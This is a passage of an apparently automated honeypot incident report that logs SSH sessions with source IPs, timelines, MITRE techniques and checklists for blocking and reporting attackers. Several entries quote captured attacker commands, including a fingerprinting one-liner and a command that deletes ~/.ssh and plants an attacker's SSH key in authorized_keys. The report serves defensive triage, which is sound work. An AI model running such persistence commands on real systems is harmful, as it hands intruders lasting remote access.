- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b42ce90fca35

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:34 |
| **Last Seen** | 2026-07-17 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:34:39` | `cowrie.session.connect` |
| `2026-07-17 17:34:39` | `cowrie.client.version` |
| `2026-07-17 17:34:39` | `cowrie.client.kex` |
| `2026-07-17 17:34:39` | `cowrie.login.success` |
| `2026-07-17 17:34:40` | `cowrie.session.params` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.success` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.command.input` |
| `2026-07-17 17:34:40` | `cowrie.log.closed` |
| `2026-07-17 17:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f06f5b5ed759

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-07-17 17:40 |
| **Last Seen** | 2026-07-17 17:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:40:05` | `cowrie.session.connect` |
| `2026-07-17 17:40:06` | `cowrie.client.version` |
| `2026-07-17 17:40:06` | `cowrie.client.kex` |
| `2026-07-17 17:40:08` | `cowrie.login.success` |
| `2026-07-17 17:40:08` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81d61622ecb

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]254` |
| **First Seen** | 2026-07-17 17:40 |
| **Last Seen** | 2026-07-17 17:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:40:06` | `cowrie.session.connect` |
| `2026-07-17 17:40:07` | `cowrie.client.version` |
| `2026-07-17 17:40:07` | `cowrie.client.kex` |
| `2026-07-17 17:40:09` | `cowrie.login.success` |
| `2026-07-17 17:40:10` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]254` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ab62f39c1b

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-17 17:40 |
| **Last Seen** | 2026-07-17 17:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:40:15` | `cowrie.session.connect` |
| `2026-07-17 17:40:16` | `cowrie.client.version` |
| `2026-07-17 17:40:16` | `cowrie.client.kex` |
| `2026-07-17 17:40:18` | `cowrie.login.success` |
| `2026-07-17 17:40:19` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef84d1a58824

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-07-17 17:40 |
| **Last Seen** | 2026-07-17 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:40:18` | `cowrie.session.connect` |
| `2026-07-17 17:40:18` | `cowrie.client.version` |
| `2026-07-17 17:40:18` | `cowrie.client.kex` |
| `2026-07-17 17:40:20` | `cowrie.login.success` |
| `2026-07-17 17:40:20` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe5f8326504

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 17:41 |
| **Last Seen** | 2026-07-17 17:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:41:24` | `cowrie.session.connect` |
| `2026-07-17 17:41:24` | `cowrie.client.version` |
| `2026-07-17 17:41:24` | `cowrie.client.kex` |
| `2026-07-17 17:41:27` | `cowrie.login.success` |
| `2026-07-17 17:41:28` | `cowrie.session.params` |
| `2026-07-17 17:41:28` | `cowrie.command.input` |
| `2026-07-17 17:41:28` | `cowrie.log.closed` |
| `2026-07-17 17:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214ecade427e

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-17 17:43 |
| **Last Seen** | 2026-07-17 17:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:43:43` | `cowrie.session.connect` |
| `2026-07-17 17:43:44` | `cowrie.client.version` |
| `2026-07-17 17:43:44` | `cowrie.client.kex` |
| `2026-07-17 17:43:46` | `cowrie.login.success` |
| `2026-07-17 17:43:48` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6890ca9031ca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:45 |
| **Last Seen** | 2026-07-17 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:45:38` | `cowrie.session.connect` |
| `2026-07-17 17:45:38` | `cowrie.client.version` |
| `2026-07-17 17:45:38` | `cowrie.client.kex` |
| `2026-07-17 17:45:38` | `cowrie.login.success` |
| `2026-07-17 17:45:39` | `cowrie.session.params` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.success` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.command.input` |
| `2026-07-17 17:45:39` | `cowrie.log.closed` |
| `2026-07-17 17:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcde4dd43ef1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:49 |
| **Last Seen** | 2026-07-17 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:49:08` | `cowrie.session.connect` |
| `2026-07-17 17:49:08` | `cowrie.client.version` |
| `2026-07-17 17:49:08` | `cowrie.client.kex` |
| `2026-07-17 17:49:08` | `cowrie.login.success` |
| `2026-07-17 17:49:09` | `cowrie.session.params` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.success` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.command.input` |
| `2026-07-17 17:49:09` | `cowrie.log.closed` |
| `2026-07-17 17:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc328e4f1182

| Field | Detail |
|---|---|
| **Source IP** | `222.86.168[.]224` |
| **First Seen** | 2026-07-17 17:51 |
| **Last Seen** | 2026-07-17 17:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:51:08` | `cowrie.session.connect` |
| `2026-07-17 17:51:10` | `cowrie.client.version` |
| `2026-07-17 17:51:10` | `cowrie.client.kex` |
| `2026-07-17 17:51:12` | `cowrie.login.success` |
| `2026-07-17 17:51:13` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.86.168[.]224` to AbuseIPDB if not already reported
- [ ] Block `222.86.168[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5044a3aff13f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]205` |
| **First Seen** | 2026-07-17 17:59 |
| **Last Seen** | 2026-07-17 17:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:59:30` | `cowrie.session.connect` |
| `2026-07-17 17:59:31` | `cowrie.client.version` |
| `2026-07-17 17:59:31` | `cowrie.client.kex` |
| `2026-07-17 17:59:35` | `cowrie.login.success` |
| `2026-07-17 17:59:35` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]205` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c18802f1c3ff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 18:00 |
| **Last Seen** | 2026-07-17 18:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:00:29` | `cowrie.session.connect` |
| `2026-07-17 18:00:29` | `cowrie.client.version` |
| `2026-07-17 18:00:29` | `cowrie.client.kex` |
| `2026-07-17 18:00:30` | `cowrie.login.success` |
| `2026-07-17 18:00:31` | `cowrie.session.params` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.success` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.command.input` |
| `2026-07-17 18:00:31` | `cowrie.log.closed` |
| `2026-07-17 18:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a20f69a32013

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 18:02 |
| **Last Seen** | 2026-07-17 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:02:14` | `cowrie.session.connect` |
| `2026-07-17 18:02:14` | `cowrie.client.version` |
| `2026-07-17 18:02:14` | `cowrie.client.kex` |
| `2026-07-17 18:02:15` | `cowrie.login.success` |
| `2026-07-17 18:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf626a3dbc20

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 18:02 |
| **Last Seen** | 2026-07-17 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:02:14` | `cowrie.session.connect` |
| `2026-07-17 18:02:14` | `cowrie.client.version` |
| `2026-07-17 18:02:15` | `cowrie.client.kex` |
| `2026-07-17 18:02:15` | `cowrie.login.success` |
| `2026-07-17 18:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd084cd4fcfe

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 18:02 |
| **Last Seen** | 2026-07-17 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:02:18` | `cowrie.session.connect` |
| `2026-07-17 18:02:18` | `cowrie.client.version` |
| `2026-07-17 18:02:18` | `cowrie.client.kex` |
| `2026-07-17 18:02:19` | `cowrie.login.success` |
| `2026-07-17 18:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-916f600612b9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 18:02 |
| **Last Seen** | 2026-07-17 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:02:19` | `cowrie.session.connect` |
| `2026-07-17 18:02:19` | `cowrie.client.version` |
| `2026-07-17 18:02:19` | `cowrie.client.kex` |
| `2026-07-17 18:02:20` | `cowrie.login.success` |
| `2026-07-17 18:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3ae26d46a9

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-07-17 18:02 |
| **Last Seen** | 2026-07-17 18:07 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:02:53` | `cowrie.session.connect` |
| `2026-07-17 18:02:53` | `cowrie.client.version` |
| `2026-07-17 18:02:53` | `cowrie.client.kex` |
| `2026-07-17 18:02:55` | `cowrie.login.success` |
| `2026-07-17 18:02:55` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993f52c389ca

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-07-17 18:06 |
| **Last Seen** | 2026-07-17 18:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:06:05` | `cowrie.session.connect` |
| `2026-07-17 18:06:06` | `cowrie.client.version` |
| `2026-07-17 18:06:06` | `cowrie.client.kex` |
| `2026-07-17 18:06:08` | `cowrie.login.success` |
| `2026-07-17 18:06:08` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70af0e257a84

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-07-17 18:06 |
| **Last Seen** | 2026-07-17 18:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:06:14` | `cowrie.session.connect` |
| `2026-07-17 18:06:15` | `cowrie.client.version` |
| `2026-07-17 18:06:15` | `cowrie.client.kex` |
| `2026-07-17 18:06:17` | `cowrie.login.success` |
| `2026-07-17 18:06:17` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef522b6cbcb1

| Field | Detail |
|---|---|
| **Source IP** | `103.174.103[.]19` |
| **First Seen** | 2026-07-17 18:07 |
| **Last Seen** | 2026-07-17 18:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:07:44` | `cowrie.session.connect` |
| `2026-07-17 18:07:44` | `cowrie.client.version` |
| `2026-07-17 18:07:44` | `cowrie.client.kex` |
| `2026-07-17 18:07:45` | `cowrie.login.success` |
| `2026-07-17 18:07:46` | `cowrie.session.params` |
| `2026-07-17 18:07:46` | `cowrie.command.input` |
| `2026-07-17 18:07:46` | `cowrie.command.failed` |
| `2026-07-17 18:07:47` | `cowrie.log.closed` |
| `2026-07-17 18:07:48` | `cowrie.session.params` |
| `2026-07-17 18:07:48` | `cowrie.command.input` |
| `2026-07-17 18:07:48` | `cowrie.session.file_download` |
| `2026-07-17 18:07:48` | `cowrie.log.closed` |
| `2026-07-17 18:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.103[.]19` to AbuseIPDB if not already reported
- [ ] Block `103.174.103[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13efcf99ec3d

| Field | Detail |
|---|---|
| **Source IP** | `103.174.103[.]19` |
| **First Seen** | 2026-07-17 18:07 |
| **Last Seen** | 2026-07-17 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:07:49` | `cowrie.session.connect` |
| `2026-07-17 18:07:49` | `cowrie.client.version` |
| `2026-07-17 18:07:49` | `cowrie.client.kex` |
| `2026-07-17 18:07:50` | `cowrie.login.success` |
| `2026-07-17 18:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.103[.]19` to AbuseIPDB if not already reported
- [ ] Block `103.174.103[.]19` at perimeter firewall / security group
